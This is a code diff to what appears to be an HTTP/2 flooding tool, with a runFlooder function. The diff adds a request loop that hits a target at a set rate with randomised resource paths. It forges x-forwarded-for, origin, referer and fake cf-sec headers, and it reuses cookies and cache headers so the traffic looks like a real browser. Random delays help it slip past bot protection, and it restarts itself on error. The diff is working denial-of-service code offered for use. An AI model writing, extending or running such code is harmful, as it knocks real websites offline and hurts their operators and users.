-                            await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 3000)));
-                        }
-                    }
+            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                if (Math.random() < 0.1) {
+                    await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 5000)));
                 }
 
-                await sendRequests();
-            }, getRandomInt(5000, 10000));
-        });
+                for (let i = 0; i < args.Rate; i++) {
+                    const requestPromise = new Promise(async (resolve, reject) => {
+                        const resource = randomElement(resourcePaths);
+                        const selectedPath = resource.path;
+                        const secFetchDest = resource.dest;
+                        const method = Math.random() < 0.9 ? "GET" : "HEAD";
+
+                        const resourceSpecificHeaders = {
+                            "style": { "accept": "text/css,*/*;q=0.1", "sec-fetch-dest": "style" },
+                            "script": { "accept": "*/*", "sec-fetch-dest": "script" },
+                            "image": { "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8", "sec-fetch-dest": "image" },
+                        };
+
+                        const dynamicHeaders = {
+                            ...(Math.random() < 0.4 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }),
+                            ...(Math.random() < 0.75 && { "referer": "https://" + clength }),
+                            ...(Math.random() < 0.75 && {
+                                "origin": Math.random() < 0.5 ?
+                                    "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/') :
+                                    "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength
+                            }),
+                            ...(Math.random() < 0.5 && { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
+                            ...(Math.random() < 0.5 && { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
+                            "RTT": "1",
+                            ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
+                        };
+
+                        const finalHeaders = {
+                            ...baseHeaders,
+                            ":method": method,
+                            ":path": selectedPath,
+                            "sec-fetch-dest": secFetchDest,
+                            ...(resourceSpecificHeaders[secFetchDest] || {}),
+                            ...dynamicHeaders,
+                        };
+
+                        const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
+                        if (cookieHeader) {
+                            finalHeaders['cookie'] = cookieHeader;
+                        }
+
+                        const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
+                        if (cachedInfo) {
+                            if (cachedInfo.etag) {
+                                finalHeaders['if-none-match'] = cachedInfo.etag;
+                            }
+                            if (cachedInfo.lastModified) {
+                                finalHeaders['if-modified-since'] = cachedInfo.lastModified;
+                            }
+                        }
+
+                        Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);
+
+                        const req = client.request(finalHeaders, {
+                            weight: Math.random() < 0.5 ? 251 : 231,
+                            depends_on: 0,
+                            exclusive: Math.random() < 0.5 ? true : false,
+                        })
+                        .on('response', response => {
+                            const setCookie = response['set-cookie'];
+                            if (setCookie) {
+                                sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
+                            }
+
+                            const etag = response['etag'];
+                            const lastModified = response['last-modified'];
+                            if (etag || lastModified) {
+                                sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
+                            }
+
+                            req.close(http2.constants.NO_ERROR);
+                            req.destroy();
+                            resolve();
+                        })
+                        .on('error', (err) => {
+                            reject(err);
+                        });
+
+                        req.on('end', () => {
+                            resolve();
+                        });
+
+                        req.end();
+                        await new Promise(resolve => setTimeout(resolve, getRandomInt(50, 500)));
+                    });
+                    await requestPromise.catch(() => {});
+                }
+            }
+        }
+
+        sendRequests();
+    }, getRandomInt(500, 2000));
+});
 
         client.on("close", () => {
-            console.log('[Info] HTTP/2 client closed');
             client.destroy();
             tlsSocket.destroy();
             connection.destroy();
@@ -821,7 +954,6 @@ function runFlooder() {
         });
 
         client.on("error", error => {
-            console.log(`[Error] HTTP/2 client error: ${error.message}`);
             client.destroy();
             connection.destroy();
             return runFlooder();
